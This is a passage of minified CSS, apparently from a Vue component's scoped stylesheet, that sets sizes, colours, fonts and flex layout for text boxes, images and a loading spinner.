9px;}.outer5[data-v-3a48c95a],.paragraph1[data-v-3a48c95a],.outer5[data-v-ada16cfc],.paragraph1[data-v-ada16cfc]{width:276px;height:101px;overflow-wrap:break-word;text-align:left;white-space:nowrap;}.paragraph1[data-v-3a48c95a],.paragraph1[data-v-ada16cfc]{color:#333;font-size:12px;}.infoBox1[data-v-3a48c95a],.infoBox1[data-v-ada16cfc]{width:276px;height:101px;overflow-wrap:break-word;color:#888;font-size:12px;text-align:left;white-space:pre-wrap;}.infoBox1 p[data-v-3a48c95a],.infoBox1 p[data-v-ada16cfc]{line-height:1.3;margin:6px 0;}.group3[data-v-3a48c95a],.group3[data-v-ada16cfc]{display:flex;position:relative;height:41px;margin:0 auto;}.pic2[data-v-3a48c95a],.pic2[data-v-ada16cfc]{width:52px;height:41px;margin-right:-10px;}.pic3[data-v-3a48c95a],.pic3[data-v-ada16cfc]{width:52px;height:41px;margin-left:-10px;}.u-spiner[data-v-3a48c95a],.u-spiner[data-v-ada16cfc]{position:fixed!important;top:50%;left:50%;margin-left:-25px;z-index:100;}
</style>
